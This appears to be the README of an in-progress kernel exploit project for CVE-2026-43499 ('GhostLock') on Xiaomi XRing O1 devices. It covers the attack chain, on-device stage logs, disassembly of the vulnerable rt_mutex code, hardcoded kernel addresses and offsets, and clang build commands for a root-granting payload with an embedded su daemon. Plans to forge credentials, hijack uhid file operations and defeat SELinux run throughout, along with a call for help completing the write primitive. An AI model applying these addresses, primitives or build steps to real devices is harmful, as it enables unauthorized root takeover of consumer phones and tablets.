# CVE-2026-43499 (GhostLock) — XRing O1 Exploit Research

> Target: Xiaomi Pad 7 Ultra (jinghu) / Xiaomi 15S Pro (dijun), XRing O1 SoC
> Kernel: 6.6.77-android15-8-g5770c661275f-abogki443185593-4k
> Reference: Littlenine Ennea's successful dijun exploit
> Nature: Kernel security research / exploit porting

## Attack Chain

```
[1] kernelsnitch leaks mm_struct (futex-hash side channel)
    ↓ no device interface required, pure side channel
[2] prepare_good_kernel_page heap-sprays (fake_task/fake_w0/fake_fops)
    ↓ skb spray into the kernel SLUB
[3] futex_wait_requeue_pi leaves a dangling pi_blocked_on (stack UAF)
    ↓ rt_mutex_cleanup_proxy_lock skips remove_waiter
[4] pselect reuses the same stack region; core_sys_select overwrites waiter fields
    ↓ waiter->lock = &pselect_user_lock (user space, PAN does not block)
[5] consumer sched_setattr triggers rt_mutex_adjust_prio_chain
    ↓ PI chain: waiter→lock→owner(fake_task)→fake_w0.pi_tree
[6] rb_insert writes *(target) = &stack_waiter.pi_tree_entry (a STACK address, not a controlled value!)
    ↓ can only write a stack address, cannot write 0 / init_cred directly
[7] point pi_blocked_on at the sprayed-page fake_w0 + forge cred → write pointer slot = &fake_w0.pi_tree_entry
    ↓ task->cred/real_cred points to the forged cred (uid=0) → root
```

## On-Device Test Progress (2026-07-18)

Staged testing (test_minimal.so STAGE 1-7):

| Stage | Test content | Result |
|---|---|---|
| STAGE 1 | Basic init (disable_rseq/set_limit/pin_to_core) | OK |
| STAGE 2 | futex basics (FUTEX_LOCK_PI/UNLOCK_PI) | OK |
| STAGE 3 | kernelsnitch_setup (cpu_count=10) | OK |
| STAGE 4 | clone_leak_child (find_collisions) | OK |
| STAGE 5 | bruteforce leak of mm_struct | OK ★ leak succeeded |
| STAGE 6 | prepare_good_kernel_page (spray) | OK ★ page ready |
| STAGE 7 | run_main_route_threads (PI chain trigger) | OK ★ consumer succeeded 40 times |

**Example mm_struct addresses leaked by kernelsnitch**: ffffff80186c5500, ffffff8109969400, ffffff818fe72d00

**PI-chain trigger log**:
```
pselect returned attempt=1 ret=0 errno=0 calls=40 success=40 delay=50000
```

## Current Blockers (confirmed 2026-07-18)

### 1. The PI-chain write value is a stack address, not write_pc (confirmed, most critical)

**Disassembly of chain_disasm.txt confirms**: the `rb_insert` inside `rt_mutex_adjust_prio_chain` (line 193) executes `str x25, [x11, x13]`,
where x25 = the pi_tree_entry address of the waiter that `task->pi_blocked_on` points to (a stack address).

**On-device verification** (STAGE=7, stack painting val=0):
```
CMP_REQUEUE_PI ret=1       ← UAF triggered
waiter WAIT_REQUEUE_PI ret=0 ← UAF confirmed
stack-painted val=0 tgt=SELINUX_ENFORCING-8  ← stack painting correct
pselect returned calls=40 success=40  ← PI chain triggered
enforce AFTER=1 (still Enforcing)  ← write failed (stack address, not 0)
```

**Conclusion**: The PI-chain write primitive **can only write a stack address**; it cannot write 0 or init_cred. This is precisely why dijun uses "two walks + a forged cred".

### What the dijun route really means

```
walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (sprayed page's known address)
walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
        where the fake_w0 page forges a cred struct (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
```

To make the write controllable: point `task->pi_blocked_on` at **the sprayed-page fake_w0** (instead of the stack waiter),
so x25 = &fake_w0.pi_tree_entry (a known address), and the fake_w0 page can forge a cred.

### 2. mm_struct → task_struct (reading mm->owner)

kernelsnitch leaks the mm_struct address. To write task->cred you need the task_struct address, which requires reading mm_struct + 0x408 (mm->owner).

**All known kernel-read paths are unavailable, rooted in the ashmem SELinux wall (see team comparison below)**:
- configfs_read_once **code itself is correct** (byte-for-byte identical to the team version, sets CFG_PAGE_OFF + pos to read), but it needs an **ashmem fd** to carry the target address
- `/dev/ashmem` is mode 666 but SELinux blocks the open in the shell domain (Permission denied) → configfs reads / pipe physrw all starve
- /proc/self/stat kstkesp=0 (kptr_restrict)
- BPF/debugfs not readable; perf_event rejected by SELinux (`{ kernel }` tclass=perf_event)

Available resource: **/dev/uhid (crw-rw-rw-, openable in the shell domain, verified fd=3)** — see "Team comparison + uhid breakthrough" below.

### 3. ashmem SELinux block (the real blocker)

`/dev/ashmem` is mode 666 but SELinux blocks the open in the shell domain. It not only blocks the fops route's configfs verification, but more fatally: **the team's entire back end (pipe physrw arbitrary RW + install_android_root privilege escalation) is also built on top of configfs_read_once**, and starves behind the same wall.

The cred direct-write also needs to read mm->owner → blocked by the same wall.

### ★ Team comparison (ayyy7128/CVE-2026-43499-jinghu) + uhid breakthrough

The team report was cloned and analyzed file-by-file (see `docs/team-compare.md`); key conclusions:

1. **Both sides share the identical kernel build, with fully aligned offsets** (init_task/init_cred/selinux/ashmem_misc_fops match), KASLR=0.
2. **Both are stuck at exactly the same place**: configfs_read_once code is already consistent and correct, but the ashmem fd is denied by SELinux in the shell domain → configfs reads return 0. The team's PROGRESS.md admits "configfs read still rd=0".
3. **The team's /dev/mem fallback is infeasible on Android** (CONFIG_STRICT_DEVMEM).
4. **Breakthrough direction — uhid fops redirection**: `/dev/uhid` is `crw-rw-rw-` and **openable in the shell domain** (our uhid_test.c verified fd=3), while /dev/ashmem is not. KASLR=0 → `uhid_fops` address is known → the GhostLock write primitive can point `uhid_fops` at the sprayed-page fake fops, then open("/dev/uhid") triggers the hijack → arbitrary kernel RW, thereby bypassing the missing read primitive from ashmem.
   - caveat: the team's configfs arbitrary read relies on ashmem's proprietary name-blob mechanism, which uhid lacks; a separate `.read`/`.unlocked_ioctl` arbitrary-RW gadget must be found for the uhid fd. This is the **most valuable unverified hypothesis**, pending device re-connection experiments.

## Pitfalls Encountered

### Pit 1: Root cause of configfs_read_once failure = ashmem SELinux wall (not a code bug, not an Android 16 patch)

Disassembly of configfs_bin_read_iter (0xffffffc080488c9c) confirms the CFG_* offsets are correct (0x50/0x58/0x60/0x64 fully match).
**But the configfs_read_once code itself is correct and usable** (byte-for-byte identical to the team version, sets CFG_PAGE_OFF + pos to read) — the earlier "code bug (needs_read_fill=0 not setting buffer_size)" was a misjudgment of an older version; the current code is fixed.

The **real reason** for the on-device return of 0: configfs_read_once needs an ashmem fd to carry the target (ASHMEM_SET_NAME), and **/dev/ashmem open is denied by SELinux in the shell domain**. fd cannot be opened → read returns 0.
The team's PROGRESS.md similarly admits "configfs read still rd=0". The earlier doc's claim "Android 16 patched configfs" was a misjudgment — it is the SELinux policy blocking the shell-domain ashmem open.

### Pit 2: Route deviation (fops hijacking vs cred direct-write)

- dijun does cred direct-write: mm leaked → two walks write task->cred/real_cred=init_cred
- jinghu did fops hijacking: write ashmem_misc_fops → configfs verification → leak_kernel_base → install_root
- fops route depends on configfs (a fatal dependency); cred direct-write is cleaner

### Pit 3: page_base=0 problem

test_minimal STAGE 6 sets page_base, but STAGE 7 do_pselect_fake_lock_route sees 0. Cause unknown (possibly multithread visibility or compiler optimization). Fix: STAGE 7 re-runs prepare_good_kernel_page.

### Pit 4: pr_error calls exit(-1)

When SYSCHK fails, pr_error calls exit(-1), causing the process to exit after the ashmem open fails, hiding subsequent results. Fix: redefine pr_error to not exit, or make open_ashmem_device not use SYSCHK.

### Pit 5: rt_mutex_waiter layout

Disassembly confirms: pi_tree_entry is at +0x28 (not +0x18), with extra prio/deadline fields. fake_task.pi_blocked_on must point at the start of the fake_w0 struct (not pi_tree_entry), otherwise the second hop reads the lock field with a misalignment.

### Pit 6: pselect does not block

readfds all zero + exceptfds=NULL → do_select finds no fd to check and returns immediately with ret=0. Fix: set exceptfds to a pipe read end so pselect blocks until timeout.

## Key Data

### Addresses (KASLR=0, vmlinux→runtime subtract 0xc080000000)
```
KIMAGE_TEXT_BASE  = 0xffffffc080000000
init_task         = 0xffffff80020de280
init_cred         = 0xffffff80020f0548
selinux_state     = 0xffffff8002315f68
ashmem_misc_fops  = 0xffffff800223b5e8
uhid_fops         = 0xffffffc0812bb120   (const struct file_operations)
uhid_misc         = 0xffffffc082234fc0   (struct miscdevice)
uhid_misc.fops    = 0xffffffc082234fd0   (= uhid_misc + 0x10, currently points to uhid_fops)
```
**uhid fops hijack target (bypass the ashmem SELinux wall)**: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8`
→ GhostLock writes `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry` (sprayed page) → open("/dev/uhid") triggers the hijack.

### task_struct offsets
```
cred=+0x818  real_cred=+0x820  pi_blocked_on=+0x938
pi_waiters=+0x920  real_parent=+0x628  comm=+0x830
```

### mm_struct offset
```
owner=+0x408 (MM_OWNER_OFF)
```

### rt_mutex_waiter layout (disassembly-verified)
```
+0x00 tree_entry (rb_node 24B)
+0x18 prio (u32)
+0x20 deadline (u64)
+0x28 pi_tree_entry (rb_node 24B) ← PI tree traversal uses this
+0x40 pi_prio (u32)
+0x50 task (ptr)
+0x58 lock (ptr) ← key field
```

### Write primitive (confirmed)
```
set_pselect_write(target-8, value, 0)
→ fake_w0.pi_tree.rb_left = target-8
→ fake_w0.pi_tree.__rb_parent_color = value
→ PI chain rb_insert: *(target) = &stack_waiter.pi_tree_entry (stack address, not value!)
```

To make the write controllable: point task->pi_blocked_on at the sprayed-page fake_w0 (instead of the stack waiter),
then rb_insert writes &fake_w0.pi_tree_entry (known address), and the fake_w0 page can forge a cred.

### Key disassembled functions
```
ashmem_open            = 0xffffffc080c7af5c (struct ashmem_area=0xdc0, name@+0x0)
configfs_bin_read_iter = 0xffffffc080488c9c
configfs_read_iter     = 0xffffffc080488978
rt_mutex_adjust_prio_chain   = 0xffffffc081052868 (rb_insert line 193: str x25,[x11,x13])
rt_mutex_cleanup_proxy_lock  = 0xffffffc081052634 (owner==current skips remove_waiter)
task_blocks_on_rt_mutex      = 0xffffffc081051c08 (★ task->pi_blocked_on=waiter @+0x938)
try_to_take_rt_mutex         = 0xffffffc081051820 (takes lock, writes pi_tree_entry)
remove_waiter                = 0xffffffc0810520f0 (clears pi_blocked_on=NULL)
```

## rb_insert / PI-chain write path reverse engineering (2026-07-18)

Tools: android-ndk-r27d's `llvm-objdump` / `llvm-nm` to disassemble `vmlinux_extracted` (ELF64 aarch64, not stripped, 41.6MB). Full report in `RESEARCH_NOTES/rb_insert_analysis.md`; disassembly artifacts in `RESEARCH_NOTES/disasm/`.

### Key conclusions

| Item | Conclusion |
|------|------|
| Does rb_insert have its own symbol? | No. The kernel implements it as `__rb_insert_augmented` (0xffffffc08102dd40). PI-tree insertion relies on `rb_insert_color` (0xffffffc08102d91c) for rebalancing; the link-in happens at the caller's `stp xN,xzr,[node,#0x28]` step |
| PI-tree node link field | waiter's **`pi_tree_entry` @ +0x28** (not tree_entry +0x00) |
| rb_insert write target | the address of the inserted node's pi_tree_entry (`&waiter->pi_tree_entry`), not an arbitrary value |
| Vulnerability trigger origin | `task_blocks_on_rt_mutex` @ 0xffffffc081051d40: `str x21,[x20,#0x938]` → **task->pi_blocked_on = waiter** |
| cleanup skips remove_waiter | `rt_mutex_cleanup_proxy_lock` skips remove_waiter when `owner==current` (x20==SP_EL0), leaving pi_blocked_on dangling to the stack waiter |
| Stack overwrite point | `core_sys_select` `sub sp,#0x1f0`; do_select is called within the frame, and register saves on pselect's second entry overwrite the waiter fields |

### task_blocks_on_rt_mutex — hangs the waiter into the tree and writes pi_blocked_on

```
ffffffc081051d04: stp x12, xzr, [x21]              // waiter->rb_parent_color = parent
ffffffc081051d0c: str x21, [x12, x15]             // parent->child = waiter
ffffffc081051d30: str x21, [x19, #0x10]           // lock->waiters.rb_node = waiter (tree empty)
ffffffc081051d34: mov x0, x21
ffffffc081051d38: bl rb_insert_color              // recolor & rebalance
ffffffc081051d40: str x21, [x20, #0x938]          // ★ task->pi_blocked_on = waiter
```

Hangs the waiter's pi_tree_entry (+0x28) into the owner's pi_waiters:
```
ffffffc081051e34: add x0, x21, #0x28              // ★ x0 = &waiter->pi_tree_entry (+0x28)
ffffffc081051e98: stp x11, xzr, [x21, #0x28]      // waiter->pi_tree_entry.rb_parent_color = x11
ffffffc081051eb8: str x0, [x22, #0x928]           // owner->pi_waiters.rb_leftmost = &waiter->pi_tree_entry
ffffffc081051ec0: bl rb_insert_color
```

### try_to_take_rt_mutex — also writes pi_tree_entry when taking the lock

When current successfully takes the lock, it inserts the stack-top waiter's pi_tree_entry into current's pi_waiters:
```
ffffffc081051a38: stp x12, xzr, [x8, #0x28]       // ★ waiter->pi_tree_entry.rb_parent_color = x12
ffffffc081051a40: str x0, [x12, x15]              // parent->child = &waiter->pi_tree_entry
ffffffc081051a58: str x0, [x20, #0x928]           // current->pi_waiters.rb_leftmost = &waiter->pi_tree_entry
ffffffc081051a5c: bl rb_insert_color
```

### rt_mutex_cleanup_proxy_lock — the branch that skips remove_waiter (★ the vulnerability itself)

```
ffffffc081052654: mrs x20, SP_EL0                 // x20 = current (SP_EL0 points at the current task)
ffffffc081052664: bl try_to_take_rt_mutex
ffffffc081052668: ldr x8, [x19, #0x18]            // lock->owner
ffffffc08105266c: and x22, x8, #~1               // owner = lock->owner & ~1
ffffffc081052670: cmp x22, x20                    // owner == current ?
ffffffc081052674: b.eq +0x50                      // ★ if owner==current, skip remove_waiter!
ffffffc081052680: bl remove_waiter                // otherwise clean up pi_blocked_on normally
```

### remove_waiter — normal cleanup (not executed if skipped)

```
ffffffc081052178: str xzr, [x20, #0x938]          // ★ task->pi_blocked_on = NULL (cleaned up!)
```

### core_sys_select — stack layout and overwrite

```
ffffffc0803dfdf8: sub sp, sp, #0x1f0              // 496-byte stack frame
ffffffc0803dfe14: add x29, sp, #0x190            // frame base
```

do_select is called within the frame (`bl do_select`); the stack register-save area is at sp+0x190~0x1e0; the stack reuse area sp+0x80~0x190 is overwritten by register saves / memset on pselect's second entry → overwriting the original waiter's prio/deadline/task/lock fields. This is the hardware basis for "pselect reuses the same stack region, core_sys_select's saved registers overwrite the waiter fields".

### Disassembly artifacts (RESEARCH_NOTES/disasm/)

| File | Function | Address |
|------|------|------|
| rb_insert_color.disasm.txt | rb_insert_color | 0xffffffc08102d91c |
| __rb_insert_augmented.disasm.txt | __rb_insert_augmented (kernel rb_insert) | 0xffffffc08102dd40 |
| rb_erase.disasm.txt | rb_erase | 0xffffffc08102da44 |
| rb_erase_cached.disasm.txt | rb_erase_cached | 0xffffffc080128074 |
| rb_first/next/prev.disasm.txt | rb_first/next/prev | 0xffffffc08102df00~ |
| task_blocks_on_rt_mutex.disasm.txt | task_blocks_on_rt_mutex | 0xffffffc081051c08 |
| try_to_take_rt_mutex.disasm.txt | try_to_take_rt_mutex | 0xffffffc081051820 |
| rt_mutex_start_proxy_lock.disasm.txt | rt_mutex_start_proxy_lock | 0xffffffc081052058 |
| remove_waiter.disasm.txt | remove_waiter | 0xffffffc0810520f0 |
| rt_mutex_cleanup_proxy_lock.disasm.txt | rt_mutex_cleanup_proxy_lock | 0xffffffc081052634 |
| rt_mutex_adjust_prio_chain.disasm.txt | rt_mutex_adjust_prio_chain | 0xffffffc081052868 |
| rt_mutex_setprio.disasm.txt | rt_mutex_setprio | 0xffffffc0800f1f6c |
| core_sys_select.disasm.txt | core_sys_select | 0xffffffc0803dfdf4 |

Full report: `RESEARCH_NOTES/rb_insert_analysis.md`.

## TODO (work that needs to be done)

### Priority 1: Make the write primitive controllable (pi_blocked_on → fake_w0)
Currently rb_insert writes a stack address. We need `task->pi_blocked_on` to point at the sprayed-page fake_w0:
- Stack-paint the stack waiter's pi_blocked_on field (+0x50) to point at fake_w0
- Forge a cred struct on the fake_w0 page (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
- Two walks write the real_cred/cred pointer slots = &fake_w0.pi_tree_entry

### Priority 2: Solve mm->owner read (★ currently highest priority, a gap shared by both sides)
The real blocker is the ashmem SELinux wall, not a configfs code bug. Candidate breakthroughs (by priority):
1. **uhid fops redirection bootstrap** (most valuable hypothesis, target address already extracted):
   - Target: `write_left = uhid_misc.fops - 8 = 0xffffffc082234fc8` (KASLR=0)
   - GhostLock writes `*(0xffffffc082234fd0) = &fake_w0.pi_tree_entry` (sprayed page)
   - Then `open("/dev/uhid")` (openable in shell domain, verified fd=3) → that fd's `file->f_op` points at the sprayed fake fops
   - Forge a fake fops table on the sprayed page, pointing `.read`/`.unlocked_ioctl` at a kernel gadget that can do arbitrary RW (buf/arg user-controllable)
   - Need to disassemble vmlinux to enumerate gadgets (uhid lacks the team's configfs name-blob mechanism, cannot be reused directly)
2. Enumerate all devices openable in the shell domain, looking for a better fops-hijack target than uhid (one with a controllable-parameter syscall).
3. Re-examine whether /dev/ashmem can be opened in another domain/path.
4. Secondary: perf_event (rejected by SELinux), eBPF (usually unavailable), sock_diag side channel.

### Priority 3: child mm → parent task
kernelsnitch runs inside clone_leak_child, leaking the child mm. To write the parent cred, read child task->real_parent (+0x628) to get the parent task_struct. Or modify kernelsnitch to run in the parent.

### Priority 4: Multiple walks (slot mechanism)
dijun uses two walks (slot_idx=1 writes real_cred, slot_idx=2 writes cred+selinux). The slot mechanism needs to be implemented.

### Priority 5: brk #0x800 crash
rt_mutex_setprio triggers a BUG on the non-null pi_blocked_on path (about 20 rounds in). dijun avoids it with csettle_us=500 (microsecond-level timing).

## File List

```
share-poc-XRing-O1/
├── README.md              Project overview (attack chain / progress / pitfalls / key data / TODO)
├── README_EN.md           English version of this document
├── RESEARCH_NOTES.md      Research notes (vulnerability principle / technical route / difficulties)
├── RESEARCH_NOTES/        rb_insert / PI-chain write-path reverse engineering
│   ├── rb_insert_analysis.md   Full reverse-engineering report (12 sections: rb_insert/PI chain/stack layout/primitive determination)
│   └── disasm/                15 key function disassembly files (see "rb_insert / PI-chain write path reverse engineering" above)
├── docs/
│   ├── findings.md        Key findings summary (configfs bug / kernelsnitch works / PI-chain write issue)
│   └── team-compare.md    ★ Team report comparison (ayyy7128) + uhid breakthrough
├── src/                   Full source (compilable)
│   ├── test_minimal.c     Staged test program (STAGE 1-7 isolate panic points)
│   ├── main_cred.c        cred direct-write framework (run_exploit 3-walk cred write)
│   ├── target.h           jinghu offset config (addresses / struct offsets)
│   ├── common.h           Core header (global declarations / macro defs / extern decls)
│   ├── util.c             kernelsnitch wrapper + prepare_kernel_page + configfs_read_once
│   ├── fops.c             do_pselect_fake_lock_route + PI-chain trigger + cfi verification
│   ├── slide.c            KASLR bypass (boot_id write verification)
│   ├── pipe.c             pipe stage (install_pipe_physrw)
│   ├── root.c             install_android_root (privilege escalation / root install)
│   ├── offset.h           target config entry (includes target.h)
│   ├── su_daemon.c        su daemon (root shell service)
│   ├── su_blob.S          embeds su_daemon binary (.incbin, needs build/embed resources)
│   ├── wallpaper_blob.S   embeds wallpaper binary (.incbin, needs assets/ resources)
│   └── kernelsnitch/      kernelsnitch leak core implementation (futex-hash side channel)
│       ├── kernelsnitch.h  Full mm_struct leak implementation (450 lines, bruteforce search)
│       ├── futex_hash.h    futex hash function (bucket computation)
│       ├── timeutils.h     timing measurement utilities (rdtsc, etc.)
│       └── utils.h         pr_info/pr_error/SYSCHK macro definitions
├── disasm/                Key function disassembly (extracted from vmlinux_extracted)
│   ├── chain_disasm.txt   ★ rt_mutex_adjust_prio_chain (PI-chain core! confirms rb_insert write value)
│   ├── do_select_disasm.txt   do_select (pselect stack layout, waiter overwrite position)
│   ├── do_select_full_disasm.txt  do_select full disassembly
│   ├── core_sys_select_disasm.txt  core_sys_select (saved registers overwrite waiter fields)
│   ├── futex_requeue_full.txt  futex_wait_requeue_pi full flow (stack UAF trigger)
│   ├── futex_wait_requeue_pi_full.txt  futex_wait_requeue_pi (vulnerability trigger point)
│   └── adjust_pi_disasm.txt  rt_mutex_adjust_pi (PI-chain entry)
└── refs/                   Reference data
    ├── kallsyms.txt       Kernel symbol table (766 bytes, partial key symbols)
    └── kernel_config.txt  Kernel config (219KB, extracted from /proc/config.gz)
```

### Build notes

The `.incbin` resources in su_blob.S/wallpaper_blob.S (build/embed/su_daemon_aarch64_pie, assets/wallpaper.webp) are not included in this repo. Building requires fetching these two resource files from the CyberMeowfia upstream (IonStack/CVE-2026-43499/exploit/).

Build command:
```bash
# Must be run inside the CyberMeowfia/exploit directory (provides the incbin resources)
NDK=android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I src -DTARGET_CONFIG_H="targets/jinghu/target.h" \
  src/test_minimal.c src/main.c src/util.c src/slide.c src/fops.c \
  src/pipe.c src/root.c src/su_blob.S src/wallpaper_blob.S \
  -shared -o test_minimal.so -pthread -fuse-ld=lld
```

### cred direct-write route build (this project's main line)

`src/main_cred.c` is the cred direct-write framework (3 walks writing real_cred/cred/selinux).
`util.c` adds an independent kernel-read back end `kread_*` (/proc/kcore or /dev/mem),
for `leak_task_struct()` to map mm_struct → task_struct (not depending on the broken ashmem/configfs).

Build: use the `.c` files in this directory's `src/`, but the `.incbin` resources (su_daemon_aarch64_pie / wallpaper.webp embedded in su_blob.S/wallpaper_blob.S) still need to be fetched from the CyberMeowfia upstream.
```bash
NDK=android-ndk-r27d/toolchains/llvm/prebuilt/windows-x86_64
CY=CyberMeowfia/IonStack/CVE-2026-43499/exploit   # provides the incbin resources
clang --target=aarch64-linux-android35 --sysroot=$NDK/sysroot \
  -O2 -fPIC -I share-poc-XRing-O1/src -DTARGET_CONFIG_H="target.h" \
  share-poc-XRing-O1/src/main_cred.c share-poc-XRing-O1/src/util.c \
  share-poc-XRing-O1/src/slide.c share-poc-XRing-O1/src/fops.c \
  share-poc-XRing-O1/src/pipe.c share-poc-XRing-O1/src/root.c \
  $CY/src/su_blob.S $CY/src/wallpaper_blob.S \
  -shared -o preload_cred.so -pthread -fuse-ld=lld
```
Note: Before running, compile `src/read_probe.c` with the same NDK and confirm that /proc/kcore or /dev/mem
can be opened in the shell domain and can read out init_cred (uid/gid==0). If neither can be opened, another kernel-read path is still needed.

## Contact

Discussion is welcome from anyone with research interest or ideas. Core help wanted: **making the PI-chain write primitive controllable (pi_blocked_on→fake_w0 + forged cred) + the mm->owner kernel read**.

---

*This research is for security research and defense purposes only.*
